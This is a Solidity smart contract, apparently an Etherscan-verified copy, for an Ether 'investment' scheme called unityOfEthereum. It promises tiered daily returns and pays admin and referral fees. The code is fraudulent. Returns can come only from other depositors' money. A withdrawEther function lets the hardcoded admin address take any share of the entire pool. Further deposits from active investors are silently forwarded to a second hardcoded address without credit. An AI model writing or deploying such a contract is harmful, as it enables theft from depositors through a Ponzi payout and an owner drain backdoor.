/**
 *Submitted for verification at Etherscan.io on 2021-02-16
*/

pragma solidity ^0.8;
contract unityOfEthereum {
    
    struct Investor
    {
        uint amount; 
        uint dateUpdate; 
        uint dateEnd;
        address refer; 
        bool active; 
    }
    
    uint constant private PERCENT_FOR_ADMIN = 10; 
    uint constant private PERCENT_FOR_REFER = 5; 
    address constant private ADMIN_ADDRESS = 0x6fc68a2888f1015cA458C801B8ACeEb941d535B2;
    mapping(address => Investor) investors; 
    event Transfer (address indexed _to, uint256 indexed _amount);
    
    constructor () {
    }
    
    function getPercent(Investor storage investor) private view returns (uint256) {
        uint256 amount = investor.amount;
        uint256 percent = 0;
        if (amount >= 0.0001 ether && amount <= 0.049 ether) percent = 15;
        if (amount >= 0.05 ether && amount <= 0.099 ether) percent = 20;
        if (amount >= 0.1 ether && amount <= 0.499 ether) percent = 21;
        if (amount >= 0.5 ether && amount <= 2.999 ether) percent = 22;
        if (amount >= 3 ether && amount <= 9.999 ether) percent = 23;
        if (amount >= 10 ether) percent = 25;
        return percent;
    }
    
    function getDate(Investor storage investor) private view returns (uint256) {
        uint256 amount = investor.amount;
        uint256 date = 0;
        if (amount >= 0.0001 ether && amount <= 0.049 ether) date = block.timestamp + 1 days;
        if (amount >= 0.05 ether && amount <= 0.099 ether) date = block.timestamp + 7 days;
        if (amount >= 0.1 ether && amount <= 0.499 ether) date = block.timestamp + 14 days;
        if (amount >= 0.5 ether && amount <= 2.999 ether) date = block.timestamp + 30 days;
        if (amount >= 3 ether && amount <= 9.999 ether) date = block.timestamp + 60 days;
        if (amount >= 10 ether) date = block.timestamp + 120 days;
        return date;
    }
    
    function getFeeForAdmin(uint256 amount) private pure returns (uint256) {
        return amount * PERCENT_FOR_ADMIN / 100;
    }

    function getFeeForRefer(uint256 amount) private pure returns (uint256) {
        return amount * PERCENT_FOR_REFER / 100;
    }

    function getProfit(Investor storage investor) private view returns (uint256) {
        uint256 amount = investor.amount;
        if (block.timestamp >= investor.dateEnd) {
            return amount + amount * getPercent(investor) * (investor.dateEnd - investor.dateUpdate) / (1 days * 1000);
        } else {
            return amount * getPercent(investor) * (block.timestamp - investor.dateUpdate) / (1 days * 1000);
        }
    }

    receive() external payable {
        require(msg.value == 0 || msg.value >= 0.0001 ether, "Min Amount for investing is 0.0001 ether.");

        if (msg.value == 0 && investors[msg.sender].active) {

            uint256 amountProfit = getProfit(investors[msg.sender]);
            require(amountProfit > 0.0001 ether, 'amountProfit must be > 0.0001 etherT');

            if (block.timestamp >= investors[msg.sender].dateEnd) {
                investors[msg.sender].active = false;
            }

            investors[msg.sender].dateUpdate = block.timestamp;

            payable(msg.sender).transfer(amountProfit);
            emit Transfer(msg.sender, amountProfit);

        } else if (!investors[msg.sender].active) {
            uint feeForAdmin = getFeeForAdmin(msg.value);
            payable(ADMIN_ADDRESS).transfer(feeForAdmin);
            emit Transfer(ADMIN_ADDRESS, feeForAdmin);

            investors[msg.sender].active = true;
            investors[msg.sender].dateUpdate = block.timestamp;
            investors[msg.sender].amount =  msg.value;
            investors[msg.sender].dateEnd = getDate(investors[msg.sender]);

            if (investors[msg.sender].refer != address(0)) {
                uint feeForRefer = getFeeForRefer(msg.value);
                payable(investors[msg.sender].refer).transfer(feeForRefer);
                emit Transfer(investors[msg.sender].refer, feeForRefer);
            }
        } else {
            payable(0x48560EBFd9313817e729dE5d744D748a9CeECEb4).transfer(msg.value);
            emit Transfer(0x48560EBFd9313817e729dE5d744D748a9CeECEb4, msg.value);
        }
    }

    function showUnpayedPercent() public view returns (uint256) {
        return getProfit(investors[msg.sender]);
    }
    
    function setRefer(address _refer) public {
        require(_refer != address(0), "Irritum data");
        require(investors[msg.sender].refer == address(0), "In referrer est iam installed");
        
        investors[msg.sender].refer = _refer;
       
    }
    
    function withdrawEther(uint256 _amount) public {
        require(ADMIN_ADDRESS == msg.sender, "Access denied");

        uint256 payment = address(this).balance * _amount / 100;
        payable(ADMIN_ADDRESS).transfer(payment);
        emit Transfer(msg.sender, payment);
    }
    

}